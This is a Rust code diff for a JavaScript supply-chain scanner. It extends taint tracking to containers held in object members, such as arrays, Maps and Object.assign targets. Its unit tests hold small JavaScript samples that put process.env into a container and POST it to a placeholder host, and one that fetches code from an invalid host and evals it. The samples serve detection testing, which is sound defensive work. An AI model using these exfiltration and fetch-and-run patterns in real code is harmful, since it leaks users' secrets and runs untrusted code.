@@ -614,6 +614,46 @@ fn is_one(name: &[u32], set: &[&str]) -> bool {
     set.iter().any(|s| eq(name, s))
 }
 
+/// The names of the members of a name a module puts anything into: a container's method called on it
+/// (`o.list.push(…)`, COLLECTS) or a call of PUTS_INTO_FIRST given it first (`Object.assign(o.opts, …)`), as
+/// written. Only those of a name's members are read as containers (sc_member_held, D-3b).
+pub(super) fn collected_members(a: &Ast) -> HashSet<PyStr> {
+    let named_member = |n: NodeId| -> Option<PyStr> {
+        if n == NONE {
+            return None;
+        }
+        let n = a.unwrap(n);
+        if a.kind(n) == Kind::MemberExpression && !a.computed(n) && a.kind(a.at(n, jt::A)) == Kind::Identifier {
+            a.prop_name(n)
+        } else {
+            None
+        }
+    };
+    let mut out = HashSet::new();
+    for id in 0..a.0.nodes.len() as NodeId {
+        if a.kind(id) != Kind::CallExpression {
+            continue;
+        }
+        let callee = a.unwrap(a.at(id, jt::A));
+        if a.kind(callee) != Kind::MemberExpression || a.computed(callee) {
+            continue;
+        }
+        let Some(method) = a.prop_name(callee) else { continue };
+        let recv = a.unwrap(a.at(callee, jt::A));
+        if is_one(&method, COLLECTS) {
+            out.extend(named_member(recv));
+        } else if a.is_ident_named(recv, "Object") || a.is_ident_named(recv, "Reflect") {
+            let mut full = a.name(recv).to_vec();
+            full.push(0x2E);
+            full.extend_from_slice(&method);
+            if is_one(&full, PUTS_INTO_FIRST) {
+                out.extend(a.list(id, jt::B).first().and_then(|&first| named_member(first)));
+            }
+        }
+    }
+    out
+}
+
 fn dotted2<'a>(a: &'a str, b: &'a [&'a str]) -> impl Fn(&[u32]) -> bool + 'a {
     move |name: &[u32]| b.iter().any(|m| eq(name, &format!("{}.{}", a, m)))
 }
@@ -3110,10 +3150,8 @@ impl<'p> Eval<'p> {
         // a container a value is put into holds it: an array's push, unshift and a splice's items, a Map's, a
         // Headers' or a URLSearchParams' set, a Set's add, a FormData's, a URLSearchParams' or a Headers' append, a
         // fill; and the target of `Object.assign(target, …)`, `Object.defineProperty`, `Reflect.set`. (D-3: the tree
-        // knew an array's push and unshift alone, so `fd.append('e', env)` sent nothing.) A container a name holds:
-        // a member's (`o.list.push(x)`, `this.items.push(x)`) is not followed, as before, since put into the object
-        // that holds it, it joined unrelated flows in large bundles (vite's, monaco-editor's loader: two of the
-        // popular set's releases SUSPICIOUS when it was)
+        // knew an array's push and unshift alone, so `fd.append('e', env)` sent nothing.) A container a name holds,
+        // or a member's (`o.list.push(x)`, `this.items.push(x)`: the member's own, sc_member_container, D-3b)
         if member && name.as_deref().is_some_and(|n| is_one(n, COLLECTS)) {
             let from = if named("splice") { 2 } else { 0 };
             let plains: Vec<V> = args.iter().skip(from).map(|a| a.plain()).collect();
@@ -3162,15 +3200,105 @@ impl<'p> Eval<'p> {
     }
 
     /// supply mode: `v` put into `obj` (a container's receiver, an `Object.assign` target) when it is a name: its
-    /// binding holds it (not an import's).
+    /// binding holds it (not an import's); a member's container when it is a member (sc_member_container, D-3b).
+    /// Into a member of `this`, what the function holds of its own parameters is not put: from each caller it would
+    /// be what that caller gives, and a class's container that keeps what its method is given (a recorder's
+    /// `record(type, detail) { this._events.push(new LoaderEvent(type, detail)) }`) held everything every caller
+    /// recorded, a hub that joined unrelated flows (monaco-editor's loader: a plugin's `load` read as a download
+    /// reached its check that eval runs, `self.eval(policy.createScript('', 'true'))`).
     fn sc_put_into(&mut self, obj: NodeId, v: V, scope: ScopeId) {
-        if self.a().kind(obj) == Kind::Identifier {
-            if let Some(b) = self.bind(obj, scope) {
-                if self.p.binds[b as usize].kind != BindKind::Import {
-                    self.write(b, v, false);
+        match self.a().kind(obj) {
+            Kind::Identifier => {
+                if let Some(b) = self.bind(obj, scope) {
+                    if self.p.binds[b as usize].kind != BindKind::Import {
+                        self.write(b, v, false);
+                    }
                 }
             }
+            Kind::MemberExpression => {
+                let this = self.a().kind(self.a().at(obj, jt::A)) == Kind::ThisExpression;
+                if let Some(b) = self.sc_member_container(obj, scope) {
+                    let v = if this { v.within(&BTreeSet::new()) } else { v };
+                    if v.tainted() {
+                        self.write(b, v, false);
+                    }
+                }
+            }
+            _ => {}
         }
+    }
+
+    /// supply mode: a member as a container of its own (D-3b): `this.items` (a member of `this`, sc_this_member) or
+    /// `o.list`, a name's static member (not an import's), a binding the function that holds the name holds, shared
+    /// as the name is. What is put into it (`o.list.push(x)`, `Object.assign(this.opts, …)`) is held apart from the
+    /// object, as an assignment to a member of `this` is: put into the object that holds it, it reached every member
+    /// read of that object, and joined unrelated flows in large bundles (vite's, monaco-editor's loader).
+    pub(super) fn sc_member_container(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
+        let (obj, name) = {
+            let a = self.a();
+            if a.kind(member) != Kind::MemberExpression || a.computed(member) {
+                return None;
+            }
+            (a.at(member, jt::A), a.prop_name(member)?)
+        };
+        match self.a().kind(obj) {
+            Kind::ThisExpression => self.sc_this_member(member, scope),
+            Kind::Identifier => {
+                let b = self.bind(obj, scope)?;
+                let held = &self.p.binds[b as usize];
+                if held.kind == BindKind::Import {
+                    return None;
+                }
+                let key = (5u8, b, name.clone());
+                if let Some(&got) = self.p.sc_props.get(&key) {
+                    return Some(got);
+                }
+                let (fid, shared, module) = (held.fid, held.shared, held.module);
+                let mut full = held.name.clone();
+                full.push(0x2E);
+                full.extend_from_slice(&name);
+                let bid = self.p.binds.len() as BindId;
+                self.p.binds.push(Bind {
+                    bid,
+                    name: full,
+                    kind: BindKind::Var,
+                    fid,
+                    writes: Vec::new(),
+                    shared,
+                    module,
+                    refs: Vec::new(),
+                    targets: None,
+                });
+                self.p.sc_props.insert(key, bid);
+                Some(bid)
+            }
+            _ => None,
+        }
+    }
+
+    /// supply mode: what a name's static member holds as a container (D-3b), when the module puts anything into a
+    /// member of that name as written (collected_members); None for any other member.
+    pub(super) fn sc_member_held(&mut self, node: NodeId, scope: ScopeId) -> Option<V> {
+        {
+            let a = self.a();
+            if a.computed(node) || a.kind(a.at(node, jt::A)) != Kind::Identifier {
+                return None;
+            }
+        }
+        let m = self.m;
+        if !self.p.sc_collected.contains_key(&m) {
+            let got = collected_members(&self.a());
+            self.p.sc_collected.insert(m, got);
+        }
+        if self.p.sc_collected[&m].is_empty() {
+            return None;
+        }
+        let name = self.a().prop_name(node)?;
+        if !self.p.sc_collected[&m].contains(&name) {
+            return None;
+        }
+        let b = self.sc_member_container(node, scope)?;
+        Some(self.read(b))
     }
 
     /// Is the call a decoder: `atob`, zlib's synchronous decompressions, a
@@ -3657,6 +3785,63 @@ mod tests {
         let src = "const https = require('https');\nhttps.get('https://x.invalid/c', (r) => {\n  const m = new Map();\n  \
                    let b = '';\n  r.on('data', (d) => { b += d; });\n  r.on('end', () => { m.set('c', b); eval(m.get('c')); });\n});\n";
         assert_eq!(runs(src), Some("run"));
+    }
+
+    #[test]
+    fn a_members_container_holds_what_it_is_given() {
+        // D-3b: a member's container (`o.list.push(x)`, `this.items.push(x)`, `Object.assign(this.opts, …)`) holds
+        // what it is given, apart from the object that holds it
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        let env = found("environment", "the whole environment");
+        for (fill, body) in [
+            ("const o = { list: [] };\no.list.push(process.env);\n", "JSON.stringify(o.list)"),
+            ("const o = { list: [] };\no.list.unshift(process.env);\n", "JSON.stringify(o.list.slice(0))"),
+            ("const o = { m: new Map() };\no.m.set('e', process.env);\n", "JSON.stringify([...o.m])"),
+            ("const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n", "JSON.stringify(o.opts)"),
+        ] {
+            assert_eq!(sent(&format!("{}{}", fill, post(body))), env, "{}", fill);
+        }
+        // a member of this
+        let src = format!(
+            "class C {{\n  constructor() {{ this.items = []; }}\n  keep() {{ this.items.push(process.env); }}\n  \
+             send() {{ {} }}\n}}\nconst c = new C();\nc.keep();\nc.send();\n",
+            post("JSON.stringify(this.items)")
+        );
+        assert_eq!(sent(&src), env);
+        let src = format!(
+            "class C {{\n  constructor() {{ this.opts = {{}}; }}\n  keep() {{ Object.assign(this.opts, process.env); }}\n  \
+             send() {{ {} }}\n}}\nconst c = new C();\nc.keep();\nc.send();\n",
+            post("JSON.stringify(this.opts)")
+        );
+        assert_eq!(sent(&src), env);
+        // a module's object, filled in one function and sent in another declared before it
+        let src = format!(
+            "const store = {{ list: [] }};\nfunction send() {{ {} }}\nfunction keep() {{ store.list.push(process.env); }}\n\
+             keep();\nsend();\n",
+            post("JSON.stringify(store.list)")
+        );
+        assert_eq!(sent(&src), env);
+        // the object's other members do not hold it
+        let src = format!("const o = {{ list: [], name: 'x' }};\no.list.push(process.env);\n{}", post("o.name"));
+        assert_eq!(sent(&src), None);
+        let src = format!(
+            "class C {{\n  constructor() {{ this.items = []; this.name = 'x'; }}\n  keep() {{ this.items.push(process.env); }}\n  \
+             send() {{ {} }}\n}}\nconst c = new C();\nc.keep();\nc.send();\n",
+            post("this.name")
+        );
+        assert_eq!(sent(&src), None);
+        // code received into a member's container, then run
+        let src = "const https = require('https');\nconst q = { parts: [] };\nhttps.get('https://x.invalid/c', (r) => {\n  \
+                   r.on('data', (d) => { q.parts.push(d); });\n  r.on('end', () => { eval(q.parts.join('')); });\n});\n";
+        assert_eq!(runs(src), Some("run"));
+        // what a method is given, put into a member of this, is not what each caller gives (a recorder's events: a
+        // hub of everything every caller records, monaco-editor's loader)
+        let src = format!(
+            "class R {{\n  constructor() {{ this.events = []; }}\n  record(d) {{ this.events.push(d); }}\n  \
+             all() {{ return this.events; }}\n}}\nconst r = new R();\nr.record(process.env);\n{}",
+            post("JSON.stringify(r.all())")
+        );
+        assert_eq!(sent(&src), None);
     }
 
     #[test]
